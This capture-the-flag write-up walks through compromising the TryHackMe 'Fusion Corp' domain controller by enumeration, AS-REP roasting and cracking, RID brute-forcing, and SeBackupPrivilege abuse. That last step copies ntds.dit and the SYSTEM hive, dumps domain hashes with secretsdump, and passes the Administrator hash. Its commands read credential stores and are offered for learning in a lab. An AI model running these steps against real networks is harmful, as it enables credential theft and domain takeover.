## Enumeration:

I began the enumeration with a quick rustscan and found 22 open ports on the target machine.

```bash
sudo rustscan -a 10.10.227.87  -- -sC -sV -vv -oN fusion_nmap
```

After obtaining the port scan results, I observed a domain named "fusion.corp" and a DC (Domain Controller) running with the name "Fusion-DC.fusion.corp". I added the domain to the hosts file and accessed it to gather more information.

### DNS Enumeration:

To gather more information about the target, I performed DNS enumeration using the dig command and ran vhost enumeration to find other available sub-domains.

```bash
dig fusion.corp any @10.10.41.28
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6265eefb-f2d9-4951-b33f-e7de32d43a8e)

```bash
dig fusion.corp any @10.10.41.28 -t NS #to check name server
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/a01efdeb-eeee-4d60-9ef1-b070d3c3d83f)

```bash
dig all fusion.corp @10.10.41.28
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/a0512a4f-b554-4df5-a843-f26aae852ba6)

During the DNS enumeration, I didn't discover anything new that wasn't already found in the port scan results. However, during vhost enumeration, I found one more sub-domain named "goods" that is running in the fusion corp network.

```bash
ffuf -H "Host: FUZZ.fusion.corp" -u http://10.10.41.28 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 53888
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/08634532-5722-4bd6-8f36-e6083a40d32e)

I added this new sub-domain to the hosts file as well for further enumeration.

### Web Enumeration:

Upon browsing through the website, I observed that they are providing various IT services:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/45e99a74-5ea3-46ec-9a1f-e4966bc10643)

To further enumerate the website, I performed directory enumeration and found new sub-directories in the result:

```bash
gobuster dir -u http://fusion.corp -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o fusion_web -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/934bc699-5a21-452a-aece-4920ffda0f99)

In one of the sub-directory named "backup", I found an .ods file which contains some employee-related data.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/5c16b185-6c73-4bb2-9360-294183087ce9)

When I checked the file, I discovered that it contains the names of some employees and their internal usernames present in the Excel sheet.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f995d76e-3ca6-4355-a826-6bd49243af57)

### Kerberoasting:

After extracting the usernames and creating a new user list, I attempted to perform AS-REP roasting and discovered that out of 11 users, I successfully obtained a hit for the user 'lparker' for whom Kerberos pre-authentication was disabled.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2fb8e203-29c4-46f8-87b1-4acf6e5c9326)

I used hashcat to crack the hash, and within seconds, I obtained the plain-text password from the cracked hash. ðŸ™‚

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b399c7da-87d6-48a7-837b-151bfa34bc3a)

Using the plain-text password, I tried to log in using Evil-winrm and successfully gained access. After logging in, I found the first flag on the user's desktop.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/cac41c78-9038-478c-9c21-197e696f9ce0)

## Further Enumeration:

After gaining access to the user lparker, I decided to perform a RID brute-force using CrackMapExec with his credentials to check for more users present in the network. To my surprise, I discovered another user named '**jmurphy**'.

```bash
crackmapexec smb fusion.corp -u "lparker" -p '*************' --rid-brute
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4af01907-368a-45df-92c7-7f5762fd4a1c)

During my manual search for any lateral movement vector, I couldn't find anything. However, I decided to run the 'net user' command against the user 'jmurphy' just to try my luck. To my astonishment, I found that there was a huge OpSec failure, as the password of the user 'jmurphy' was mentioned in the comment.

```PS
net user /dom jmurphy
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/98446391-f63c-4df8-aa80-1ce0a98cd3f5)

I used these credentials to log into the 'jmurphy' account using WinRM and successfully obtained the 2nd flag. (pwn3d!ðŸ™‚)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Privilege Escalation:

After gaining access to the user jmurphy, I performed manual enumeration and executed the command below to check the user's privileges:

```PS
whoami /all
```
The output of the whoami command showed that the user "jmurphy" has "SeBackupPrivilege" and "SeRestorePrivilege" enabled.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9d2605fd-4a64-4de5-a10c-343f6a17883a)

As I searched on the internet, I found a [blog](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960) that described how "**SeBackupPrivilege**" provides users with full read permissions and the ability to create system backups. This privilege allows users to read any file on the machine, including sensitive files like SAM, SYSTEM hives, or NTDS.dit.

```
An attacker can leverage this privilege to extract the hashes from these files and either crack them or pass them (PTH) to elevate their shell.

In workstations, we need the SAM and System hive files to extract the hashes, while in domain controller machines, we need the ntds.dit file and system hive .
```

The blog mentioned three ways to obtain the "ntds.dit" file which contains all the hashes. I decided to follow the "Diskshadow + Robocopy" process.

Diskshadow is a Windows built-in utility that can create copies of a drive that is currently in use. So, at first I need to create a script file with all the commands needed to create a copy of the hash file, either SAM or NTDS.dit files in which we can extract them later locally.

I used a script file with the necessary commands to create a copy of the "ntds.dit" file, which we can extract later.

```diskshadow
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

I uploaded the script to the Fusion Corp machine and used the Diskshadow utility to run the script.

```
diskshadow /s diskshadow.txt
```

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/eaf510a5-ae36-456e-a6b0-e229a3e04f27)

After the completion of the Diskshadow process, a new backup drive 'E' was created, and I could navigate into that drive.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8afafa77-623e-47a6-9a51-ba75cf0576b4)

Even though I was in the backup drive, I still did not have access to the files in the Administrator folder. However, I could create a copy of the NTDS.dit file, as I had backup privileges.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/42e29302-fff5-4a88-ae2a-d46a287fedad)

So, I created a backup of NTDS.dit from the E: drive in the temp folder using the robocopy function.

```
robocopy /b E:\Windows\ntds . ntds.dit
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2338a326-8956-4ae9-9663-3ec6067692b9)

After obtaining the NTDS.dit file, I needed another file called "system," which works as an encryption key to decrypt the credentials from the NTDS.dit file.

To extract the "SYSTEM" file from the registry into our temp directory, I used the following command:

```PS
reg save hklm\system c:\temp\system
```

After having both files, I transferred them to my Kali host and used "secretsdump" to dump all the hashes.

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/36c1d05e-9f09-4ba2-a48e-fbb2abcf62e8)

After dumping the hashes of all the users from the NTDS.dit file, I didn't crack any of them. Instead, I used the Administrator hash to log in.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8352f599-350e-4c8f-a3a2-3572c0aadf85)

After logging in successfully, I retrieved the final flag. (pwn3d!ðŸ™‚)
